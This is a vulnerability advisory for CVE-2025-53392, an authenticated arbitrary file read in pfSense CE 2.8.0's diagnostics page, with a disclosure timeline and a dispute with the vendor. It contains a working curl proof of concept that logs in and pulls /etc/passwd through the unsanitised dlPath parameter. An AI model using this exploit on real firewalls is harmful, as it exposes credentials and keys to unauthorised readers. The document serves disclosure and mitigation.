# Arbitrary File Read in pfSense 2.8.0 via Diagnostics Web Interface

#### CVE ID: [`CVE-2025-53392`](https://nvd.nist.gov/vuln/detail/CVE-2025-53392)

#### Date: 2025-06-27

#### Author: Seth Kraft

#### Vendor Homepage: [https://www.netgate.com/](https://www.netgate.com/)

#### Vendor Changelog: [https://docs.netgate.com/pfsense/en/latest/releases/](https://docs.netgate.com/pfsense/en/latest/releases/)

#### Software Link: [https://www.pfsense.org/download/](https://www.pfsense.org/download/)

#### Version: pfSense CE 2.8.0 (latest stable as of June 26, 2025)

#### CWE ID: [`CWE-36`](https://cwe.mitre.org/data/definitions/36.html) (Absolute Path Traversal)

#### Estimated CVSS Base Score: 5.0 (Medium)

#### Estimated Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N`

#### Type: Authenticated Arbitrary File Read / Local File Disclosure

---

## Authorization

**For authorized testing and research purposes only.** Do not test or exploit this vulnerability on systems you do not own or have explicit permission to test.

---

## Summary

pfSense CE 2.8.0 contains a Local File Disclosure vulnerability in the diagnostics page `diag_command.php`, which allows authenticated users to download arbitrary files from the underlying file system.

This functionality lacks any path sanitization, directory restriction, or access controls beyond permission assignment.

---

## Details

The vulnerable logic is located in the file `src/usr/local/www/diag_command.php`:

```php
if ($_POST['submit'] == "DOWNLOAD" && file_exists($_POST['dlPath'])) {
    session_cache_limiter('public');
    send_user_download('file', $_POST['dlPath']);
}
```

There are no security checks or sanitization measures applied to the user-controlled `dlPath` parameter. 

Any file path the PHP process can read will be served back to the user.

---

## Proof of Concept

**Create `low-priv` group and assign a single privilege** (`WebCfg - Diagnostics: Command`)
![Screenshot 2025-06-27 133201](https://github.com/user-attachments/assets/b1063a5c-442a-4628-ac94-e0fa5d6f10c4)

> While I acknowledge the presence of a security disclaimer for the `WebCfg - Diagnostics: Command` privilege, disclaimers alone do not replace sound access control.
> 
> The phrase “Allow access to the Diagnostics Command page” is ambiguous and understates the risk — it enables unrestricted root-level command execution, not just diagnostic access.
> 
> Privilege labels in a web interface must accurately reflect the scope and severity of the actions they permit, especially when they expose full administrative control.

**Assign `low-priv` group to** `dev` **user**
![Screenshot 2025-06-27 133218](https://github.com/user-attachments/assets/7224934e-ae31-4aa1-b879-b4f1aee7e00c)

This proof-of-concept demonstrates a user assigned with only `WebCfg - Diagnostics: Command` permission can exfiltrate `/etc/passwd` by abusing the unsanitized `dlPath` parameter.

```bash
# 1. Start session and extract CSRF token
curl -k -c cookies.txt -s https://<IP>/diag_command.php > login_page.html
csrf_token=$(grep '__csrf_magic' login_page.html | grep 'value=' | sed -E 's/.*value="([^"]+)".*/\1/')

# 2. Authenticate as low-privileged user "dev"
curl -k -b cookies.txt -c cookies.txt \
  -d "__csrf_magic=$csrf_token" \
  -d "usernamefld=dev" \
  -d "passwordfld=pass" \
  -d "login=Sign+In" \
  https://<IP>/index.php > /dev/null

# 3. Get CSRF token post-login
curl -k -b cookies.txt -s https://<IP>/diag_command.php > diag_authed.html
csrf_token=$(grep '__csrf_magic' diag_authed.html | grep 'value=' | sed -E 's/.*value="([^"]+)".*/\1/')

# 4. Exfiltrate arbitrary file (example: /etc/passwd)
curl -k -b cookies.txt -s -X POST https://<IP>/diag_command.php \
  -d "__csrf_magic=$csrf_token" \
  -d "submit=DOWNLOAD" \
  -d "dlPath=/etc/passwd"
```

---

## Demo
![pfSense-authenticated-file-disclosure-poc](https://github.com/user-attachments/assets/0dfe9727-aab4-4b17-bcb9-5a69998549a5)

---

## Impact

Any pfSense user assigned the `WebCfg - Diagnostics: Command` privilege can:

* Read sensitive local system files
* Extract backups, credentials, and keys
* Access files far beyond their intended permissions

This violates the principle of least privilege and breaks logical privilege boundaries.

---

## Suggested Mitigation

1. Restrict `dlPath` to a safe base directory (e.g., `/tmp`) using `realpath()` and prefix enforcement
2. Strip or block paths with `..` or absolute paths
3. Only allow downloads of files in a safelist or temporary artifact directory

---

## Disclosure Timeline

* **2025-06-26:** Vulnerability reported to Netgate
* **2025-06-27:** Netgate responded — dismissing the issue as intended behavior
* **2025-06-27:** Researcher responded with technical rebuttal — vendor reiterated dismissal
* **2025-06-27:** Researcher initiated public disclosure due to final vendor dismissal — requested CVE assignment from MITRE
* **2025-06-28:** MITRE assigned [`CVE-2025-53392`](https://nvd.nist.gov/vuln/detail/CVE-2025-53392) with vendor disputed tag

---
## Official Response from Netgate
![Screenshot 2025-06-27 142702_redacted](https://github.com/user-attachments/assets/4b03ac3d-3feb-471e-8628-582fa3d9ef2e)
> While the vendor asserts that access to this page equates to root, this conflates web-level permissions with unrestricted backend access.
> 
> Privilege should be technically enforced — not assumed — and warnings in the UI are no substitute for secure design.

---

Challenging the vendor's claim that this functionality is "well-documented" — I found no mention in pfSense’s User Privileges documentation that states the `WebCfg - Diagnostics: Command` permission equates to root-level access.
![Screenshot 2025-06-28 235613](https://github.com/user-attachments/assets/f1da5050-1820-4e81-b8e7-4dbe3735f2c6)

---

The vendor may have been referring to the Diagnostics Command page, which includes a general warning about misuse. 

But the documentation does not explicitly link this functionality to the `WebCfg - Diagnostics: Command` privilege or clarify that it grants root-level access.
![image](https://github.com/user-attachments/assets/f050cac7-29ed-40f6-9437-972176a5885a)
> Think about it — when would a legitimate user ever need to download `/etc/passwd` through a firewall’s web interface?

---
## Security Expectations for Diagnostic Interfaces
The diagnostics module within the web interface of a firewall should contain proper safeguards to prevent abuse against the underlying operating system.

* Diagnostic commands should be functionally limited to ping, traceroute, log view, etc.
* Commands should run inside a restricted shell or chroot.
* File access should be explicitly scoped to safe directories (/tmp, /var/log).
* Permissions should be fine-grained, and clear in scope.

---

## Why This Research Matters
Before dismissing this research as trivial, understand that efforts like this often spark meaningful dialogue between security and infrastructure teams — leading to RBAC reevaluation, tighter privilege boundaries, and overall more effective approaches to application security.

---

## Disclaimer
This work was conducted outside of my employment and reflects my personal efforts in cybersecurity research.

---
